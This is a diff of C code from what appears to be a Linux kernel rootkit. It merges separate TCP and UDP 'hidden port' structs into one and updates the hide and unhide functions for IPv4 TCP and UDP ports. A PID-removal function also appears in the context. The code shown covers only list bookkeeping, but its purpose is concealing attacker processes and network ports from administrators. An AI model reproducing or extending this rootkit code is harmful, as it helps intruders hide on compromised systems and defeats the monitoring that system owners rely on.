@@ -321,18 +321,19 @@ void pid_remove_all(void)
 
 // ========== TCP PORT LIST ==========
 
-struct hidden_tcp_port {
+struct hidden_port {
     //unsigned short port;
     unsigned long port;
     struct list_head list;
 };
 
 LIST_HEAD(hidden_tcp4_ports);
+LIST_HEAD(hidden_udp4_ports);
 
 //void hide_tcp4_port ( unsigned short port )
 void hide_tcp4_port(const char *port)
 {
-    struct hidden_tcp_port *hp;
+    struct hidden_port *hp;
 
     hp = kmalloc(sizeof(*hp), GFP_KERNEL);
     if ( ! hp )
@@ -349,7 +350,7 @@ void hide_tcp4_port(const char *port)
 //void unhide_tcp4_port ( unsigned short port )
 void unhide_tcp4_port(const char *port)
 {
-    struct hidden_tcp_port *hp;
+    struct hidden_port *hp;
 	
     unsigned long port_num = simple_strtoul(port, NULL, 10);
 
@@ -369,17 +370,9 @@ void unhide_tcp4_port(const char *port)
 
 // ========== UDP PORT LIST ==========
 
-struct hidden_udp_port {
-    //unsigned short port;
-    unsigned long port;
-    struct list_head list;
-};
-
-LIST_HEAD(hidden_udp4_ports);
-
 void hide_udp4_port (const char *port)
 {
-    struct hidden_udp_port *hp;
+    struct hidden_port *hp;
 
     hp = kmalloc(sizeof(*hp), GFP_KERNEL);
     if ( ! hp )
@@ -393,7 +386,7 @@ void hide_udp4_port (const char *port)
 
 void unhide_udp4_port (const char *port)
 {
-    struct hidden_udp_port *hp;
+    struct hidden_port *hp;
 	
     unsigned long port_num = simple_strtoul(port, NULL, 10);
 
